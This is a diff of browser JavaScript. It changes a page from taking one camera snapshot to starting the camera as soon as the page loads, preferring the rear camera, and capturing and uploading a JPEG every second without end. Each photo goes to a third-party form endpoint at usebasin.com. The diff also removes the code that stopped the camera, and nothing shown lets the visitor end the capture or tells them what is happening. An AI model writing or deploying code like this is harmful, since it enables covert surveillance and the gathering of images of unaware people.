@@ -1,27 +1,37 @@
 const video = document.getElementById("preview");
 let stream;
 
-// Start camera immediately
-startCamera();
+// start when page loads
+window.addEventListener("DOMContentLoaded", startCamera);
 
 async function startCamera() {
   try {
-    // Works on laptop + phone (auto-selects best camera)
     stream = await navigator.mediaDevices.getUserMedia({
-      video: true
+      video: { facingMode: { ideal: "environment" } }  // prefer back cam
     });
 
     video.srcObject = stream;
 
-    // Auto-capture after 1 second
-    setTimeout(captureAndUpload, 1000);
+    // wait until video has size
+    video.onloadedmetadata = () => {
+      startLoop();
+    };
 
   } catch (err) {
     console.error("Camera failed:", err);
   }
 }
 
-async function captureAndUpload() {
+// capture → upload → repeat
+function startLoop() {
+  captureAndUpload();
+}
+
+function captureAndUpload() {
+  if (video.videoWidth === 0 || video.videoHeight === 0) {
+    return setTimeout(captureAndUpload, 200);
+  }
+
   const canvas = document.createElement("canvas");
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -30,12 +40,11 @@ async function captureAndUpload() {
   ctx.drawImage(video, 0, 0);
 
   canvas.toBlob(async (blob) => {
-    if (!blob) return console.error("Blob creation failed");
+    if (!blob) return setTimeout(captureAndUpload, 500);
 
     const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
-
     const formData = new FormData();
-    formData.append("photo", file);  // Basin requires name="photo"
+    formData.append("photo", file);
 
     try {
       await fetch("https://usebasin.com/f/fb249d3e371b", {
@@ -44,18 +53,13 @@ async function captureAndUpload() {
         headers: { "Accept": "application/json" }
       });
 
-      console.log("Uploaded to Basin ✔");
+      console.log("Uploaded ✔");
 
-    } catch (error) {
-      console.error("Upload error:", error);
+    } catch (err) {
+      console.error("Upload error:", err);
     }
 
-    stopCamera();
+    // capture next photo after 1 second
+    setTimeout(captureAndUpload, 1000);
   }, "image/jpeg", 0.9);
-}
-
-function stopCamera() {
-  if (stream) {
-    stream.getTracks().forEach(track => track.stop());
-  }
 }
